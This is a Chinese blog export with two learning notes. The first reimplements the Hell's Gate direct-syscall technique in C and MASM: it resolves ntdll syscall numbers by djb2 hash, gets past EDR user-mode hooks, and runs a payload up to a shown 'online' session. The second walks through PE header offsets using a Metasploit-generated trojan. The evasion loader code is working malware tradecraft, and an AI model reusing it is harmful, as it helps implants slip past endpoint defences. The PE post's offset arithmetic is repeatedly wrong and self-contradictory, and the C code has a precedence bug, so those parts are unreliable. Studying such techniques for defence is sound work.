<h3 id="3-地狱之门"><a href="#3-地狱之门" class="headerlink" title="3.地狱之门"></a>3.地狱之门</h3><p>搞了这么久，终于开始我们的正片，地狱之门的学习。</p>
<h5 id="3-1-什么是地狱之门？"><a href="#3-1-什么是地狱之门？" class="headerlink" title="3.1 什么是地狱之门？"></a>3.1 什么是地狱之门？</h5><p>利用windbg进行调试，可以看到未被HOOK的NTDLL的函数对应的汇编代码</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">uf ntdll!NtOpenProcess</span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807171136927.png" alt="image-20220807171136927"></p>
<p>NTDLL再进入Ring0执行函数内核部分前将会验证当前的线程执行环境是x64还是x86，通过对<code>ShareUserData+0x308</code>的后续测试也说明了这点。在进行判断是否执行函数前都会给eax寄存器一个系统调用号并且该调用号不同版本的Windows是不一样的，如果确定执行环境是基于x64则会通过<code>syscall</code>执行系统调用，否则会执行函数返回。</p>
<p>利用Windbg查询系统调用号:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">db (ntdll!ntopenprocess + <span class="number">0</span>x4 ) L <span class="number">2</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220905181709362.png" alt="image-20220905181709362"></p>
<p>此处利用db按字节来查看<code>ntdll模块</code>中的<code>NtOpenProcess函数</code>信息，查询是以<code>NtOpenProcess函数</code>作为基地址，偏移4个字节查询得到对应函数的系统调用号。</p>
<p>在线查询系统调用号：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">https://j00ru.vexillium.org/syscalls/nt/<span class="number">64</span>/</span><br></pre></td></tr></table></figure>

<p>这边放上crispr师傅做出的被hook过的NTDLL汇编图</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807172258575.png" alt="image-20220807172258575"></p>
<p>很显然，在<code>ZwMapViewOfSection</code>上，原来的<code>mov r10,rcx</code>已经被修改为了<code>jmp xxxxx</code>进行地址跳转，而在<code>ZwSetInformationFile</code>以及其他函数处还是未被hook过的，系统调用号分别为0x27、0x29</p>
<p>系统调用被定义为WORD类型（16位无符号整数），并存储在EAX寄存器中，并且实际上我们是能够动态获得系统调用号的,以<code>NtOpenProcess</code>为例:</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220807173014055.png" alt="image-20220807173014055"> </p>
<p>这就是地狱之门的原理，直接读取进程的第二个导入模块，也就是NtDLL,解析结构然后遍历导出表，根据函数哈希找到函数地址，将这个函数读取出来后通过<code>0xb8</code>操作码动态获取对应的系统调用号，从而绕过内存监控，在自己程序中执行了NTDLL的导出函数而不是直接<code>LoadLibrary</code>然后<code>GetProcAddress</code>做IAT隐藏</p>
<h5 id="3-2-代码实现"><a href="#3-2-代码实现" class="headerlink" title="3.2 代码实现"></a>3.2 代码实现</h5><p>我们在进行操作时，需要定义一个与syscall相关联的数据结构:<code>_VX_TABLE_ENTRY</code>事实上每一个系统调用都需要分配一个这样的结构，用于校验导出表内导出的函数是否为我们所需，存储导出表函数的地址，存储系统调用号，结构定义如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">VX_TABLE_ENTRY</span> &#123;</span></span><br><span class="line"> PVOID pAddress;</span><br><span class="line"> DWORD64 dwHash;</span><br><span class="line"> WORD wSystemCall;</span><br><span class="line">&#125; VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>其中包括指向模块的指针，一个函数hash，用于查找内存中指定函数（此处是利用djb2算法进行加密），一个<code>WORD</code>类型的系统调用号<code>wSystemCall</code>。</p>
<p>同时，我们还需要定义一个更大的结构用于包括项目中所需的每一个系统调用的函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">VX_TABLE</span> &#123;</span></span><br><span class="line"> VX_TABLE_ENTRY NtAllocateVirtualMemory;</span><br><span class="line"> VX_TABLE_ENTRY NtProtectVirtualMemory;</span><br><span class="line"> VX_TABLE_ENTRY NtCreateThreadEx;</span><br><span class="line"> VX_TABLE_ENTRY NtWaitForSingleObject;</span><br><span class="line">&#125; VX_TABLE, * PVX_TABLE;</span><br></pre></td></tr></table></figure>

<p>接下來便是使用PEB的相关结构来动态获取系统调用号和函数地址来填充刚刚定义好的数据结构，用于实现自定义系统调用，绕过EAT表限制，HellsGate作者是通过TEB获取PEB数据结构，从而拿到NTDLL模块基地址实现的操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">PTEB <span class="title">RtlGetThreadEnvironmentBlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> _WIN64</span></span><br><span class="line">	<span class="keyword">return</span> (PTEB)__readgsqword(<span class="number">0x30</span>); <span class="comment">//x64位在GS寄存器的0x30偏移处可以拿到TEB结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> (PTEB)__readfsqword(<span class="number">0x18</span>); <span class="comment">//x86位在FS寄存器的0x18偏移处可以拿到TEB结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line">PTEB pCurrentTeb = RtlGetThreadEnvironmentBlock();</span><br><span class="line">PPEB pCurrentPeb = pCurrentTeb-&gt;ProcessEnvironmentBlock;</span><br><span class="line"><span class="comment">//判断Teb、Peb是否正常取得，同时判断当前操作系统是否为Win10</span></span><br><span class="line"><span class="keyword">if</span> (!pCurrentTeb || !pCurrentPeb || pCurrentPeb-&gt;OSMajorVersion != <span class="number">0xA</span>) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Windows Version Error&quot;</span>, GetLastError());</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们拿到Peb后，接下来便是需要拿到导出表结构</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150704197.png" alt="image-20220911150704197"></p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911150726510.png" alt="image-20220911150726510"></p>
<p>取得导出表后，我们需要循环遍历导出表内的导出函数名称与地址，根据djb2算法加密函数名称拿到指定的导出函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//利用djb2算法提前加密好dwhash，等待后续与后期导出表函数名称进行对比查找指定函数</span></span><br><span class="line">VX_TABLE Table = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">Table.NtAllocateVirtualMemory.dwHash = <span class="number">0xf5bd373480a6b89b</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtAllocateVirtualMemory)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtAllocateVirtualMemory syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtCreateThreadEx.dwHash = <span class="number">0x64dc7db288c5015f</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtCreateThreadEx)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtCreateThreadEx syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtProtectVirtualMemory.dwHash = <span class="number">0x858bcb1046fb6a37</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtProtectVirtualMemory)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtProtectVirtualMemory syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Table.NtWaitForSingleObject.dwHash = <span class="number">0xc6a2fa174e551bcb</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetVxTableEntry(pLdrDataEntry-&gt;DllBase, pImageExportDirectory, &amp;Table.NtWaitForSingleObject)) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Get NtWaitForSingleObject syscall error &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HellsGate中，最关键的一个函数GetVxTableEntry，在这里我们将遍历模块内的导出函数用以查找指定函数，并判断模块中的导出函数是否被hook，以及取得函数系统调用号、函数地址、dwHash获得PVX_TABLE_ENTRY的完整结构，下一步，便是通过汇编代码模拟正常系统调用过程进行调用函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">GetVxTableEntry</span><span class="params">(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry)</span> </span>&#123;</span><br><span class="line">	PDWORD pWzAddressOfFunctions = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);</span><br><span class="line">	PDWORD pWzAddressOfNames = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);</span><br><span class="line">	PWORD pWzAddressOfOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; pImageExportDirectory-&gt;NumberOfNames; i++) &#123;</span><br><span class="line">		PCHAR pWzAddressOfName = (PCHAR)((PBYTE)pModuleBase + pWzAddressOfNames[i]);</span><br><span class="line">		PVOID pWzAddressOfFunction = (PBYTE)pModuleBase + pWzAddressOfFunctions[pWzAddressOfOrdinales[i]];</span><br><span class="line"></span><br><span class="line">		<span class="comment">//验证func hash是否一致</span></span><br><span class="line">		<span class="keyword">if</span> (djb2(pWzAddressOfName) == pVxTableEntry-&gt;dwHash) &#123;</span><br><span class="line">			pVxTableEntry-&gt;pAddress = pWzAddressOfFunction;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">		WORD wz = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span> (TRUE) &#123;</span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pWzAddressOfFunction + wz) == <span class="number">0x4c</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x01</span>) == <span class="number">0x8b</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x02</span>) == <span class="number">0xd1</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x03</span>) == <span class="number">0xb8</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x06</span>) == <span class="number">0x00</span> &amp;&amp;</span><br><span class="line">				*((PBYTE)pWzAddressOfFunction + wz + <span class="number">0x07</span>) == <span class="number">0x00</span>) &#123;</span><br><span class="line"></span><br><span class="line">				BYTE Low = *((PBYTE)pWzAddressOfFunction + wz + <span class="number">4</span>);</span><br><span class="line">				BYTE High = *((PBYTE)pWzAddressOfFunction + wz + <span class="number">5</span>);</span><br><span class="line">				<span class="comment">//大小端转换拿到syscall number</span></span><br><span class="line">				pVxTableEntry-&gt;wSystemCall = (High &lt;&lt; <span class="number">8</span>) | Low;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="comment">//判断偏移地址离所需的syscall number是否太远</span></span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pVxTableEntry-&gt;pAddress + wz) == <span class="number">0xc3</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;The function is far away from syscall number&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (*((PBYTE)pVxTableEntry-&gt;pAddress + wz) == <span class="number">0x0f</span> &amp;&amp; *(PBYTE)pVxTableEntry-&gt;pAddress + wz + <span class="number">1</span> == <span class="number">0x05</span>) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;check if ret, in this case we are also probaly too far&quot;</span>);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line">			&#125;</span><br><span class="line">			wz++;</span><br><span class="line">		&#125;;</span><br><span class="line">	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另起一个asm文件，用于保存我们的汇编代码,此处我们模拟原生函数的系统调用过程，在HellsGate定义的子程序中我们为wSystemCall赋值，HellDescent中我们将拿到的系统调用号传给eax寄存器，模仿正常系统调用过程，完成系统调用操作Nt函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> wSystemCall DWORD 0h</span><br><span class="line">.code</span><br><span class="line"> HellsGate PROC</span><br><span class="line"> mov wSystemCall, 0h</span><br><span class="line"> mov wSystemCall, ecx</span><br><span class="line"> ret</span><br><span class="line"> HellsGate ENDP</span><br><span class="line"> HellDescent PROC</span><br><span class="line"> mov r10, rcx</span><br><span class="line"> mov eax, wSystemCall</span><br><span class="line"> syscall</span><br><span class="line"> ret</span><br><span class="line"> HellDescent ENDP</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>调用<code>HellsGate、HellDescent</code>，拿到对应的Nt函数进行执行Payload进行上线。</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153238164.png" alt="image-20220911153238164"></p>
<p>成功上线</p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153607207.png" alt="image-20220911153607207"></p>
<p><img src="/../images/Hell-s-Gate%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95%E5%85%A5%E9%97%A8.assets/image-20220911153703485.png" alt="image-20220911153703485"></p>
<h5 id="注-djb2算法代码"><a href="#注-djb2算法代码" class="headerlink" title="注:djb2算法代码"></a>注:djb2算法代码</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD64 <span class="title">djb2</span><span class="params">(PBYTE str)</span> </span>&#123;</span><br><span class="line">	DWORD64 dwHash = <span class="number">0x7734773477347734</span>;</span><br><span class="line">	INT c;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (c = *str++)</span><br><span class="line">		dwHash = ((dwHash &lt;&lt; <span class="number">0x5</span>) + dwHash) + c;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> dwHash;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	DWORD64 hash = <span class="built_in">djb2</span>((PBYTE)<span class="string">&quot;NtCreateThreadEx&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;0x%llx\r\n&quot;</span>, hash);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-参考总结"><a href="#4-参考总结" class="headerlink" title="4.参考总结"></a>4.参考总结</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">https://www.crisprx.top/archives/540</span><br><span class="line">https://www.anquanke.com/post/id/261582</span><br><span class="line">https://vxug.fakedoma.in/papers/VXUG/Exclusive/HellsGate.pdf</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>红队渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>PE结构-PE文件的两种状态</title>
    <url>/2021/11/16/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81/</url>
    <content><![CDATA[<p>本文的是学习复现自吾爱破解dalao <a href="https://www.52pojie.cn/thread-1393291-1-1.html">lyl610abc</a>的PE文件解析系列，非本人原创，属于学习笔记(大佬yyds!)。</p>
<h3 id="PE文件的两种状态"><a href="#PE文件的两种状态" class="headerlink" title="PE文件的两种状态"></a>PE文件的两种状态</h3><p>PE文件处于磁盘中与处于内存中时，两者的结构会稍微发生改变。</p>
<span id="more"></span>

<p>一个PE文件可以分为两种状态:</p>
<p>运行态: 当一个PE文件被打开时，PE文件的相关数据将会被<code>装载</code>到内存中，根据文件对齐以及内存对齐中的区别，文件的大小以以及结构会发生相应的改变</p>
<p>非运行态: 当一个PE文件尚未运行时，其数据存储在<code>磁盘中</code>时的一种状态</p>
<p><strong>思维脑图</strong></p>
<p>  lyl610abc师傅太强了</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116145908655.png" alt="image-20211116145908655"></p>
<p><strong>PE文件整体结构表</strong></p>
<table>
<thead>
<tr>
<th>结构</th>
<th>对应C数据结构</th>
<th>默认占用空间大小（单位字节）</th>
</tr>
</thead>
<tbody><tr>
<td>DOS MZ头</td>
<td>_IMAGE_DOS_HEADER</td>
<td>64</td>
</tr>
<tr>
<td>DOS Stub</td>
<td>仅在MS-DOS系统下有效，不作研究</td>
<td>不固定</td>
</tr>
<tr>
<td>PE文件头</td>
<td>_IMAGE_NT_HEADERS</td>
<td>4+20+224=248 （标志+标准头+扩展头）</td>
</tr>
<tr>
<td>PE文件头标志</td>
<td>Signature</td>
<td>4</td>
</tr>
<tr>
<td>PE文件表头/标准PE头</td>
<td>_IMAGE_FILE_HEADER</td>
<td>20</td>
</tr>
<tr>
<td>PE文件表头可选部分/扩展PE头</td>
<td>_IMAGE_OPTIONAL_HEADER</td>
<td>224</td>
</tr>
<tr>
<td>块表/节表</td>
<td>_IMAGE_SECTION_HEADER</td>
<td>40</td>
</tr>
<tr>
<td>块/节</td>
<td>无</td>
<td>由块表/节表决定</td>
</tr>
</tbody></table>
<hr>
<h4 id="非运行态"><a href="#非运行态" class="headerlink" title="非运行态"></a>非运行态</h4><p>判断文件类型是否为PE格式文件</p>
<p>判断流程如下:</p>
<ul>
<li>判断前两个字节是否为4D 5A（MZ）</li>
<li>找到3Ch</li>
<li>根据3Ch位置的2字节大小数据跳转偏移至其中，查看是否为50 45 00 00(PE..)</li>
</ul>
<table>
<thead>
<tr>
<th>地址</th>
<th>长度（单位字节）</th>
<th>对应C的数据结构</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的第一个成员e_magic</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>2</td>
<td>_IMAGE_DOS_HEADER的最后一个成员e_lfanew</td>
<td>指出PE头文件偏移位置</td>
<td>不定</td>
<td>不定</td>
</tr>
<tr>
<td>[3C]</td>
<td>4</td>
<td>Signature</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>利用msf生成的exe马进行实例分析</p>
<p>使用十六进制编辑器打开，判断文件格式类型</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116150624182.png" alt="image-20211116150624182"></p>
<p>可以看到，00处起始位置为4D 5A，表示DOS头开头；3Ch处位置是1801 表示PE头文件偏移位置；利用Ctrl+G跳转至118,可以看到标准PE头50 45,此文件可以判断为是PE文件</p>
<p>对应表格数据为</p>
<table>
<thead>
<tr>
<th>地址</th>
<th>说明</th>
<th>值</th>
<th>ASCII</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>DOS MZ头的第一个成员</td>
<td>4D 5A</td>
<td>MZ</td>
</tr>
<tr>
<td>3C</td>
<td>指出PE头文件偏移位置C</td>
<td>118</td>
<td></td>
</tr>
<tr>
<td>F0</td>
<td>PE文件头标志</td>
<td>50 45 00 00</td>
<td>PE..</td>
</tr>
</tbody></table>
<p>由此，我们可以发现以PE文件头标志为开始的PE头</p>
<p>根据PE结构可知，整个PE头是:<code>PE文件头标志+标准PE头+扩展PE头</code>的标准，长度大小为4+20+224=248字节</p>
<p>根据3Ch处的<code>118</code></p>
<p>后面所占的字节地址为:0x118+4+20+224=280+4+20+224=448=0xE0</p>
<p>由此可知整个PE头所占范围为0x118~0xE0</p>
<p><strong>PE文件头标志和标准PE头:</strong></p>
<p>​    0x118+2+20=200+24=0x130</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170504766.png" alt="image-20211116170504766"></p>
<p><strong>扩展PE头</strong></p>
<p>根据先前得到的标准PE头结束后，紧挨着的224个字节便是扩展PE头所占空间</p>
<p>标准pe头结束位置:0x130</p>
<p>扩展PE头所占空间:224字节</p>
<p>所以扩展PE头所占区域为: 0x130+224=304+224=528=0x210</p>
<p>由此可知，自0xE0开始到0x1C0结束，都是扩展PE头位置</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170637779.png" alt="image-20211116170637779"></p>
<p><strong>块表</strong></p>
<p>先前拿到的扩展PE头地址后16个字节为空字节，跳过，拿到第一个块表地址</p>
<p>从先前拿到的块表头地址继续往后看40个字节(块表大小) 拿到第二个块表的首地址</p>
<p>第一个块表头地址: 0x210</p>
<p>块表大小为 40字节</p>
<p>0x210+40 = 0x238</p>
<p>第一块表范围: 0x210~0x238</p>
<p>从0x238开始便是第二个块表</p>
<p>第一个块表: .text</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170758247.png" alt="image-20211116170758247"></p>
<p>第二个块表: .rdata</p>
<p>0x238+0x28=0x260 ，块表范围为0x238~0x260</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170913559.png" alt="image-20211116170913559"></p>
<p>第三个块表: .data</p>
<p>0x260+0x28=0x288,块表范围为0x260~0x288</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116170953884.png" alt="image-20211116170953884"></p>
<p>第四块表 .sxdata</p>
<p>0x288+0x28=0x2B0,块表范围为0x288~0x2B0</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171048772.png" alt="image-20211116171048772"></p>
<p>第五块表 .rsrc</p>
<p>0x2B0+0x28=0x2D8,块表范围为0x2B0~0x2D8</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171132556.png" alt="image-20211116171132556"></p>
<p>第六块表 .reloc</p>
<p>0x2D8+0x28=0x300,块表范围为0x2D8~0x300.</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171308670.png" alt="image-20211116171308670"></p>
<p><strong>汇总块表</strong></p>
<table>
<thead>
<tr>
<th>块名称</th>
<th>块地址</th>
</tr>
</thead>
<tbody><tr>
<td>.text</td>
<td>0x210~0x238</td>
</tr>
<tr>
<td>.rdata</td>
<td>0x238~0x260</td>
</tr>
<tr>
<td>.data</td>
<td>0x260~0x288</td>
</tr>
<tr>
<td>.sxdata</td>
<td>0x288~0x2B0</td>
</tr>
<tr>
<td>.rsrc</td>
<td>0x2B0~0x2D8</td>
</tr>
<tr>
<td>.reloc</td>
<td>0x2D8~0x300</td>
</tr>
</tbody></table>
<p><strong>块表后的空隙</strong></p>
<p>块表后跟着的按理应该是块，但在块表后和块之前，多出了一段空间</p>
<p>此处为300~400</p>
<p><img src="/images/PE%E7%BB%93%E6%9E%84-PE%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%A4%E7%A7%8D%E7%8A%B6%E6%80%81.assets/image-20211116171539285.png" alt="image-20211116171539285"></p>
<p>存储时不存在空隙的，被称为<code>连续存储</code></p>
<p>但在<strong>块表以及块之间是可能存在空隙的</strong>，这个空隙里面一般被填充为编译器插入的数据（也可能不存在）</p>
<p>这段间隙的修改并不会导致程序的不可运行，因此可以拿来写入自己想要的代码来对程序进行修改</p>
<p><strong>为什么会存在这段间隙呢？</strong></p>
<ul>
<li>这段间隙是由于<strong>块表与块之间没有进行连续存储</strong></li>
<li>这段长度的存在与否以及长度，取决于块的<strong>起始位置</strong></li>
<li>而块的其实位置则根据<code>扩展PE头中的成员决定</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// Standard fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// NT additional fields.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line"></span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    WORD    DllCharacteristics;</span><br><span class="line">    DWORD   SizeOfStackReserve;</span><br><span class="line">    DWORD   SizeOfStackCommit;</span><br><span class="line">    DWORD   SizeOfHeapReserve;</span><br><span class="line">    DWORD   SizeOfHeapCommit;</span><br><span class="line">    DWORD   LoaderFlags;</span><br><span class="line">    DWORD   NumberOfRvaAndSizes;</span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结构体中的SizeOfHeaders成员(DWORD类型占4个字节)</p>
<p>SizeOfHeaders的含义是<code>3个头按文件对齐后的大小</code>：（DOS头+PE头+块表）大小加起来后进行<code>文件对齐</code>后得到的大小</p>
